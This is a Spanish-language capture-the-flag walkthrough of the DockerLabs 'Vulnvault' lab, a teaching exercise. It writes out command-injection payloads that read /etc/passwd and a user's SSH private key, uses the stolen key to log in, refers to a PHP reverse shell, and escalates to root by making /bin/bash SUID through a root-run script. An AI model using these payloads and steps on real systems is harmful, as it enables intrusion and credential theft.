# Vulnvault: Inyección de Comandos, Acceso SSH y Escalada de Privilegios en DockerLabs

Este documento detalla la resolución del ejercicio "Vulnvault" de DockerLabs, que implica la explotación de una vulnerabilidad de inyección de comandos para obtener acceso inicial, la extracción de una clave SSH para acceder al sistema y la posterior escalada de privilegios a `root` mediante el abuso de un script con permisos de superusuario.

## 1. Reconocimiento Inicial de Puertos con Nmap

```bash
nmap -O -sV -sC -p- <IP_DEL_OBJETIVO>
```

**Resultados:**

*   `22/tcp open ssh OpenSSH 9.6p1`: El puerto 22 (SSH) está abierto, lo que indica que podemos intentar acceder al sistema por esta vía si encontramos credenciales.
*   `80/tcp open http Apache httpd 2.4.58`: El puerto 80 (HTTP) está abierto y ejecuta un servidor web Apache. El título de la página (`Generador de Reportes - Centro de Operaciones`) sugiere una funcionalidad de generación de informes.

### 1.2. Fuzzing de Directorios con Gobuster

```bash
gobuster dir -w /path/to/wordlist/directory-list-lowercase-2.3-medium.txt -u http://<IP_DEL_OBJETIVO> -x php,html,txt
```

**Resultados Relevantes:**

*   `/index.php`: Página principal.
*   `/upload.html` y `/upload.php`: Sugieren una funcionalidad de carga de archivos.
*   `/old`: Un directorio que podría contener versiones antiguas o información sensible.

## 2. Explotación de Vulnerabilidades

### 2.1. Intento de Carga de Archivos (y su fallo)

Inicialmente, intentamos subir una `reverse shell` en PHP a través de la interfaz de carga de archivos (`upload.html`). Creamos un archivo `exploit.php` con el contenido de una `php-reverse-shell` (modificando la IP y el puerto a los de nuestra máquina atacante).
`https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php`

```php
// ...
$ip = '<IP_DE_TU_KALI>';  // CAMBIAR ESTO
$port = 443;       // CAMBIAR ESTO
// ...
```

Tras subir el archivo, al intentar acceder a `http://<IP_DEL_OBJETIVO>/upload.php`, el servidor indica "No se ha enviado ningún archivo.". Capturando la petición con Burp Suite, observamos que el servidor reporta un "Error al mover el archivo". Esto sugiere que la funcionalidad de carga está presente, pero hay restricciones en el movimiento o ejecución de los archivos subidos, lo que nos obliga a buscar otra vía.

![[Vulnvault_Burpsuite1.png]]

![[Vulnvault_Burpsuite2.png]]

### 2.2. Inyección de Comandos en el Generador de Reportes

Exploramos la funcionalidad de "Generador de Reportes" en la página principal. Intentamos una inyección de comandos en los campos de entrada, ya que a menudo estas funcionalidades ejecutan comandos del sistema para generar los informes.

Al introducir `; whoami` y `; ls` en los campos observamos que los comandos se ejecutan y sus salidas se muestran en el reporte. Esto confirma una vulnerabilidad de inyección de comandos.

![[Vulnvault_CommandInjection1.png]]

![[Vulnvault_CommandInjection2.png]]

**Resultados Clave:**

*   `whoami` revela que el usuario del servidor web es `www-data`.
*   `ls` muestra los archivos del directorio actual.
*   Identificamos al usuario `samara` a través de la lectura de `/etc/passwd` (realizada mediante inyección de comandos: `; cat /etc/passwd`).

## 3. Acceso Inicial (SSH)

Con la inyección de comandos, podemos leer archivos del sistema. Buscamos información sensible que nos permita acceder al sistema vía SSH.

### 3.1. Extracción de la Clave SSH de `samara`

Utilizando la inyección de comandos, intentamos listar el contenido del directorio `/home/samara/.ssh/` y leer el archivo `id_rsa`, que es la clave privada SSH del usuario `samara`.

```bash
; cat /home/samara/.ssh/id_rsa
```

La salida de este comando nos proporciona la clave privada SSH completa.

### 3.2. Conexión SSH con la Clave Privada

Para usar la clave privada, debemos asignarle los permisos correctos y luego usarla para conectarnos vía SSH.

1.  **Guardar la clave:** Crea un archivo llamado `id_rsa` en tu máquina atacante y pega el contenido de la clave obtenida.
2.  **Asignar permisos:** Las claves privadas SSH requieren permisos para ser utilizadas.

    ```bash
    chmod 600 id_rsa
    ```

3.  **Conectar vía SSH:** Utiliza la clave para conectarte como `samara`.

    ```bash
    ssh -i id_rsa samara@<IP_DEL_OBJETIVO>
    ```

Si la conexión es exitosa, hemos obtenido acceso inicial al sistema como el usuario `samara`.

### 3.3. Lectura de `user.txt`

Una vez dentro como `samara`, podemos acceder al archivo `user.txt` para obtener la primera flag.

```bash
cat user.txt

030208509edea7480a10b84baca3df3e
```

## 4. Escalada de Privilegios

Una vez que tenemos una shell como `samara`, el objetivo es escalar privilegios a `root`.

### 4.1. Identificación de Procesos con Privilegios

Buscamos procesos que se ejecuten como `root` y que puedan ser abusados. Utilizamos `ps aux` para listar todos los procesos y filtramos por `root`.

```bash
ps aux | grep root
```

**Resultados Clave:**

Observamos una línea similar a:

*   `root 1 ... /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done`

Esto indica que un script llamado `/usr/local/bin/echo.sh` se ejecuta periódicamente como `root`.

### 4.2. Análisis y Abuso de `/usr/local/bin/echo.sh`

Leemos el contenido del script para entender su función:

```bash
cat /usr/local/bin/echo.sh
```

**Contenido Original:**

```bash
#!/bin/bash  
  
echo "No tienes permitido estar aqui :(." > /home/samara/message.txt  
```

El script simplemente escribe un mensaje en `/home/samara/message.txt`. Dado que se ejecuta como `root` y tenemos permisos de escritura en `/home/samara/`, podemos modificar este script para ejecutar comandos con privilegios de `root`.

**Modificación del Script:**

Editamos el script para que, en lugar de escribir un mensaje, nos otorgue una shell con privilegios de `root` (estableciendo el bit SUID en `/bin/bash`).

```bash
echo '#!/bin/bash' > /usr/local/bin/echo.sh
echo 'chmod u+s /bin/bash' >> /usr/local/bin/echo.sh
```

Esperamos a que el script se ejecute (o reiniciamos el servicio si es posible y tenemos permisos). Una vez que se haya ejecutado, `/bin/bash` tendrá el bit SUID activado.

### 4.3. Obtención de Shell de Root

Con el bit SUID establecido en `/bin/bash`, podemos ejecutar `bash` con los privilegios del propietario del archivo (en este caso, `root`).

```bash
bash -p
```

Verificamos nuestros privilegios:

```bash
whoami
# root
```

Confirmamos que hemos escalado exitosamente a `root`.

### 4.4. Lectura de `root.txt`

Finalmente, accedemos al archivo `root.txt` para obtener la flag final.

```bash
ls /root
cat /root/root.txt
# <Contenido de root.txt>
```
